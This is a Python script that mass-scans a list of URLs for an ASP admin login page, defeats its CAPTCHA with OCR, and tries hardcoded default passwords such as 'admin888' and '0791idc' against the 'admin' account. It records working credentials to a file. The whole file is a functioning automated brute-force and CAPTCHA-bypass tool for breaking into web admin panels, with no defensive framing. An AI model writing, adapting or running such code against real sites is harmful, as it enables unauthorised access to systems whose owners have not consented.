import asyncio
import aiohttp
from PIL import Image
import pytesseract
import io
from datetime import datetime
from tqdm import tqdm
import urllib3
from queue import Queue
import threading
import sys

# Suppress warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variables
results_queue = Queue()
processed_urls = 0
progress_lock = threading.Lock()
print_lock = threading.Lock()

# Configurations
CONCURRENT_TASKS = 2
TIMEOUT = 30
MAX_RETRIES = 3
PASSWORDS = ['0791idc', 'admin123', 'admin888', '123456']

def status_print(message, url):
    """Thread-safe status printing"""
    with print_lock:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{url}] {message}")
        sys.stdout.flush()

async def get_captcha(session, url):
    try:
        captcha_url = f"{url}/admin/CheckCode/CheckCode.asp"
        status_print(f"Fetching CAPTCHA from: {captcha_url}", url)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
            'Referer': f"{url}/admin/Login.asp",
            'Connection': 'keep-alive'
        }
        
        async with session.get(captcha_url, ssl=False, timeout=TIMEOUT, headers=headers) as response:
            if response.status == 200:
                status_print("CAPTCHA image received successfully", url)
                image_data = await response.read()
                img = Image.open(io.BytesIO(image_data))
                
                status_print("Processing CAPTCHA image...", url)
                img = img.convert('L')
                img = img.point(lambda x: 0 if x < 128 else 255, '1')
                
                custom_config = '--psm 7 --oem 3 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
                captcha_text = pytesseract.image_to_string(img, config=custom_config).strip()
                
                captcha_text = ''.join(c for c in captcha_text if c.isalnum())[:6]
                if len(captcha_text) == 6:
                    status_print(f"CAPTCHA extracted successfully: {captcha_text}", url)
                    return captcha_text.lower()
                else:
                    status_print(f"Invalid CAPTCHA length: {len(captcha_text)}", url)
            else:
                status_print(f"Failed to get CAPTCHA. Status: {response.status}", url)
    except Exception as e:
        status_print(f"Error getting CAPTCHA: {str(e)}", url)
    return None

async def try_login(session, url, captcha, password):
    try:
        login_url = f"{url}/admin/CheckLogin.asp"
        status_print(f"Attempting login with CAPTCHA: {captcha}, Password: {password}", url)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': url,
            'Referer': f"{url}/admin/Login.asp",
            'Connection': 'keep-alive'
        }

        data = {
            'LoginName': 'admin',
            'LoginPassword': password,
            'CheckCode': captcha,
            'Submit': 'confirm'
        }

        async with session.post(login_url, data=data, ssl=False, headers=headers, allow_redirects=False) as response:
            status = response.status
            location = response.headers.get('Location', '')
            status_print(f"Login response - Status: {status}, Location: {location}", url)
            return status == 302 and ('main.asp' in location or 'default.asp' in location)
    except Exception as e:
        status_print(f"Login error: {str(e)}", url)
        return False

async def process_url(url):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        status_print("Starting processing", url)
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Verify login page
            status_print("Checking admin login page", url)
            try:
                async with session.get(f"{url}/admin/Login.asp", ssl=False) as response:
                    if response.status != 200:
                        status_print("Admin login page not accessible", url)
                        return
                    status_print("Admin login page found", url)
            except Exception as e:
                status_print(f"Error accessing admin page: {str(e)}", url)
                return

            # Try each password
            for password in PASSWORDS:
                status_print(f"Testing password: {password}", url)
                
                # Try multiple CAPTCHA attempts for each password
                for attempt in range(MAX_RETRIES):
                    status_print(f"Starting attempt {attempt + 1}/{MAX_RETRIES} with password {password}", url)
                    await asyncio.sleep(1)
                    
                    captcha = await get_captcha(session, url)
                    if not captcha:
                        status_print("Failed to get valid CAPTCHA, retrying...", url)
                        continue
                    
                    if await try_login(session, url, captcha, password):
                        success_msg = f"[SUCCESS] {url} - admin:{password} (CAPTCHA: {captcha})"
                        status_print(f"Login successful! {success_msg}", url)
                        with open('successful_logins.txt', 'a') as f:
                            f.write(f"{success_msg}\n")
                        return  # Exit after first successful login
                    else:
                        status_print(f"Login failed with password {password}, will retry with new CAPTCHA", url)
                
                status_print(f"All attempts failed with password {password}", url)
                await asyncio.sleep(1)

    except Exception as e:
        status_print(f"Error in processing: {str(e)}", url)
    finally:
        global processed_urls
        with progress_lock:
            processed_urls += 1
        status_print("Processing completed", url)

async def main():
    try:
        with open('urls.txt', 'r') as f:
            urls = [url.strip() for url in f.readlines() if url.strip()]

        if not urls:
            print("No URLs found in urls.txt")
            return

        print(f"Starting scan of {len(urls)} URLs...")
        print("Successful logins will be displayed below:")
        print("-" * 50)

        with tqdm(total=len(urls), desc="Processing URLs", unit="url") as pbar:
            tasks = []
            sem = asyncio.Semaphore(CONCURRENT_TASKS)

            async def process_with_semaphore(url):
                async with sem:
                    await process_url(url)
                    pbar.update(1)

            for url in urls:
                task = asyncio.create_task(process_with_semaphore(url))
                tasks.append(task)

            await asyncio.gather(*tasks)

        print("\nScan completed!")

    except Exception as e:
        print(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    asyncio.run(main())
